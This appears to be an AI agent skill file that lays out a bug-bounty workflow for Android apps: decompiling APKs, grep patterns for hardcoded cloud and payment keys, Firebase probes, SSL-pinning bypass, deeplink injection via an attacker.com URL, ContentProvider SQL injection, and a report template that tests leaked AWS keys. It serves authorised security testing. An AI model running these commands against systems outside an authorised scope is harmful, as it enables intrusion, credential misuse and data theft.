---
name: mobile-recon-android
description: Mobile (Android) app recon and analysis — decompile APK, extract secrets, find hardcoded endpoints, exposed Firebase / AWS / API keys, deeplink abuse, intent vulnerabilities, exported components, WebView XSS, MobSF static analysis. Use when target's scope includes Android apps (.apk).
metadata:
  type: skill
  phase: hunt
  vuln_class: mobile
  tools: [apktool, jadx, MobSF, frida, objection, dex2jar]
---

# Android Mobile Recon

> Mobile apps are 5 years behind web in security. APK-bundled secrets pay well.

## When to invoke

**Trigger phrases:**
- "decompile APK"
- "mobile app"
- "android security"
- "find endpoints in mobile"

## Why mobile pays

- Devs hardcode secrets in apps thinking they're "obscured"
- Mobile APIs often lack the same auth checks as web (assumed only the app calls them)
- Mobile UIs hide endpoints that desktop testers never find
- Deeplinks expose attack surface
- WebViews introduce hybrid web bugs in mobile context

## Step-by-Step Workflow

### 1. Download the APK

```bash
# Option A: gplaycli (Play Store)
pip install gplaycli
gplaycli -d "com.target.android" -f ./

# Option B: APKMirror (web download)
# https://www.apkmirror.com — manual download

# Option C: From device
adb shell pm path com.target.android
# → /data/app/com.target.android-XYZ/base.apk
adb pull /data/app/com.target.android-XYZ/base.apk

# Option D: From Bugcrowd / H1 program's "downloads" section if provided
```

### 2. Initial fingerprint

```bash
APK="target.apk"
mkdir -p target-analysis && cd target-analysis

# Hash
sha256sum "../$APK"

# Metadata
aapt dump badging "../$APK" | head -30
# Outputs: package name, version, permissions, activities, etc.
```

### 3. Decompile with apktool (resources + smali)

```bash
apktool d "../$APK" -o apk-decompiled
ls apk-decompiled/
# → AndroidManifest.xml (decoded), smali/, res/, assets/
```

### 4. Decompile to Java with jadx (the gold standard)

```bash
jadx -d jadx-output "../$APK"

# Or open the GUI
jadx-gui "../$APK"
```

jadx reverses DEX → Java. Read the source as if you wrote it.

### 5. AndroidManifest.xml — the attack surface map

```bash
# Print readable manifest
cat apk-decompiled/AndroidManifest.xml | head -200
```

Look for:

**Exported components (entry points for other apps including malicious):**
```xml
<activity android:name=".SomeActivity" android:exported="true" />
<service android:name=".SomeService" android:exported="true" />
<receiver android:name=".SomeReceiver" android:exported="true" />
<provider android:name=".SomeProvider" android:exported="true" />
```

**Deeplinks (intent filters with custom schemes / hosts):**
```xml
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="targetapp" android:host="..." />
</intent-filter>
```

Custom scheme `targetapp://` is callable from web (`<a href="targetapp://...">`) — XSS target.

**Permissions (overbroad?):**
```xml
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
```

**Backup enabled:**
```xml
android:allowBackup="true"     ← can `adb backup` extract app data?
```

**Debuggable in production:**
```xml
android:debuggable="true"      ← CRITICAL: app debuggable in release
```

### 6. Secret hunting (the goldmine)

```bash
cd jadx-output

# AWS keys
grep -hroE 'AKIA[0-9A-Z]{16}' .
grep -hroE 'aws_secret[_a-zA-Z]*\s*=\s*"[A-Za-z0-9/+]{40}"' .

# Google API keys
grep -hroE 'AIza[0-9A-Za-z\-_]{35}' .

# Stripe
grep -hroE 'sk_live_[0-9a-zA-Z]{24,}' .
grep -hroE 'pk_live_[0-9a-zA-Z]{24,}' .

# Firebase
grep -hroE 'https://[a-zA-Z0-9-]+\.firebaseio\.com' .
grep -hroE 'https://[a-zA-Z0-9-]+-default-rtdb\.firebaseio\.com' .

# Generic API keys
grep -hroE 'api[_-]?key[_-]?=\s*"[A-Za-z0-9_\-]{16,}"' .
grep -hroE 'authorization\s*:\s*"Bearer\s+[A-Za-z0-9_\-\.]+"' .

# Slack
grep -hroE 'xox[bpoars]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}' .

# Twitter API
grep -hroE 'AAAA[A-Za-z0-9%]{16,}' .

# Generic high-entropy strings
trufflehog filesystem . --json | jq .

# Run noseyparker (best for thoroughness)
noseyparker scan --datastore /tmp/np-mobile .
noseyparker report --datastore /tmp/np-mobile
```

### 7. Endpoint mining

```bash
# All URLs in source
grep -hroE 'https?://[a-zA-Z0-9._/?=&%\-]+' . | sort -u > urls.txt

# API base URLs
grep -hroE '"https?://[a-zA-Z0-9._\-]+/api/[a-zA-Z0-9./_-]*"' . | sort -u > api-urls.txt

# Specific patterns
grep -hroE 'RestAdapter|Retrofit|OkHttp|HttpURLConnection' . | head

# Firebase Realtime DB URLs
grep -hroE 'https://[a-zA-Z0-9-]+\.firebaseio\.com[^"]*' . | sort -u

# Test Firebase URLs for public read/write
FIREBASE_URL="https://target-prod-default-rtdb.firebaseio.com"
curl -s "$FIREBASE_URL/.json" | head    # read root
# If returns data → misconfigured Firebase!

# Test write
curl -X POST "$FIREBASE_URL/test.json" -d '{"test":"ccs-canary"}'
```

### 8. MobSF — automated all-in-one

```bash
# Install / Docker
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Upload APK via UI: http://localhost:8000
# Or via API:
curl -X POST -F "file=@$APK" http://localhost:8000/api/v1/upload \
     -H "Authorization: <YOUR_API_KEY>"
```

MobSF reports:
- Permissions analysis
- Network security config (CLEARTEXT traffic allowed?)
- Code analysis (suspicious patterns)
- Secret hunting
- Manifest issues
- Deeplinks
- Hardcoded URLs
- Crypto issues (DES, MD5 usage)

### 9. Deeplink testing

For each scheme/host found:
```bash
# Trigger deeplink via adb
adb shell am start -W -a android.intent.action.VIEW \
    -d "targetapp://profile/12345"

# In a WebView app, deeplinks may pass through to web — JS injection
adb shell am start -W -a android.intent.action.VIEW \
    -d "targetapp://webview?url=https://attacker.com/xss.html"
```

Common deeplink bugs:
- Open arbitrary URL in WebView (XSS, phishing)
- IDOR via deeplink (no auth check on the deeplink handler)
- Authenticated action via deeplink (CSRF-like)

### 10. Network traffic interception

```bash
# Set up proxy on PC, Burp listening on 8080
# Phone settings → WiFi → modify → proxy → manual → PC IP:8080
# Install Burp CA cert to phone

# For SSL pinning bypass:
# Use Frida + objection
pip install frida-tools objection

# Spawn the app
objection -g com.target.android explore

# In objection shell:
> android sslpinning disable

# Or with Frida
frida -U -f com.target.android -l ~/Frida-Scripts/universal-android-ssl-pinning-bypass.js
```

Now all the app's HTTPS traffic appears in Burp → you can fuzz endpoints, test for SQLi/XSS/IDOR.

### 11. Activity / component abuse

For exported Activities, try launching them directly:
```bash
adb shell am start -n com.target.android/.AdminActivity

# Or with extras
adb shell am start -n com.target.android/.PaymentActivity --es amount "-1000"
```

If an admin/internal Activity is exported and reachable from any installed app → privilege escalation on device.

### 12. ContentProvider abuse

```bash
# Test exported ContentProviders for SQL injection
adb shell content query --uri content://com.target.android.provider/users --where "1=1"
adb shell content query --uri content://com.target.android.provider/users --where "id=1 UNION SELECT password FROM users"
```

## Mobile-specific high-payout bugs

### Firebase misconfig
Mobile apps embed Firebase URLs. Test for:
- Public read: `curl https://target-default-rtdb.firebaseio.com/.json`
- Public write: `curl -X POST -d '{"x":1}' https://target-default-rtdb.firebaseio.com/test.json`

### Hardcoded keys
- Twilio (SMS bombing)
- SendGrid (email spoofing)
- Mapbox / Google Maps (quota theft, mostly low impact)
- AWS keys with overbroad IAM

### Insecure deeplinks
- Open redirect via deeplink
- Authenticated action via deeplink with no token

### Insecure WebViews
- `setJavaScriptEnabled(true)` + `addJavascriptInterface` → XSS becomes RCE
- `setAllowFileAccess(true)` → read local files

### Backup-accessible credentials
- `allowBackup=true` + sensitive data in shared prefs → `adb backup` exfil

## Output template

```markdown
## Critical: Hardcoded AWS Access Key in Android app v3.2.1 → S3 read/write access

### Summary
The production Android app `com.target.android` (v3.2.1) embeds an AWS Access Key ID and Secret Access Key in plaintext. The credentials grant full read/write access to S3 buckets containing user-uploaded files, including PII.

### Steps to reproduce
1. Download APK from Play Store (file SHA256: `abc123...`).
2. Decompile with jadx:
   ```
   jadx -d output target.apk
   ```
3. Search for hardcoded AWS keys:
   ```bash
   grep -rE 'AKIA[0-9A-Z]{16}' output/
   ```
   Output:
   ```
   output/sources/com/target/data/Constants.java:
       public static final String AWS_KEY_ID = "AKIAIO...";
       public static final String AWS_SECRET = "wJalrXU...";
   ```
4. Verify the credentials work:
   ```bash
   export AWS_ACCESS_KEY_ID=AKIAIO...
   export AWS_SECRET_ACCESS_KEY=wJalrXU...
   aws sts get-caller-identity
   {
     "UserId": "AIDA...",
     "Account": "123456789012",
     "Arn": "arn:aws:iam::123456789012:user/mobile-app-uploader"
   }
   ```
5. Enumerate S3 access:
   ```bash
   aws s3 ls
   # Lists 3 buckets including `target-user-uploads` (sensitive)
   aws s3 ls s3://target-user-uploads/
   # Lists user-uploaded receipts, ID documents
   ```

### Impact
- Full S3 read/write access to `target-user-uploads`
- ~50M user-uploaded files including ID documents, receipts
- GDPR/CCPA breach risk
- Persistent — credentials don't auto-rotate
- All current app users distribute this key (in their app install)

### Suggested fix
1. Rotate the AWS credentials immediately
2. Use AWS Cognito Identity Pools for temporary credentials per user
3. OR proxy uploads via your backend (server holds credentials, app authenticates to server)
4. Audit `Constants.java` and all related classes for other embedded secrets
```

## Cross-references

- `[[js-analysis]]` — same secret-hunting techniques in JS
- `[[cloud-misconfig]]` — what to do with extracted cloud creds
- `[[ssrf]]` — mobile API may expose SSRF if web doesn't
- `[[idor-hunting]]` — mobile APIs often have weaker IDOR protection

## Common pitfalls

1. **Reporting Firebase config without verifying it's actually misconfigured.** Check `/.json` actually returns data.
2. **Reporting hardcoded "API keys" that are public-readable by design (e.g., Google Maps key for client).** Verify the key has impact.
3. **Testing on a real device with personal data.** Use an emulator (genymotion, AVD).
4. **Not noting the app version.** Older versions matter; newer might have fixed.
5. **Skipping the manifest analysis.** Exported components = free wins.

## Severity guide

| Finding | Severity |
|---|---|
| Hardcoded AWS/Stripe Live keys with active access | Critical |
| Firebase RTDB public read/write of user data | Critical |
| Exported Activity bypassing auth | High |
| WebView with `addJavascriptInterface` + XSS source | High-Critical |
| Insecure deeplink → authenticated action | High |
| Cleartext traffic allowed in network security config | Low-Medium |
| `allowBackup=true` + sensitive shared prefs | Medium |
| Outdated dependencies with CVE | Low-Medium (need exploit) |

## iOS note

For iOS apps:
- Tools: `class-dump`, `Hopper`, `Frida`, `objection`
- IPA decryption from a jailbroken device
- Same principles: secret hunting, hardcoded URLs, insecure WebViews

If the program explicitly scopes iOS, the methodology mirrors Android.
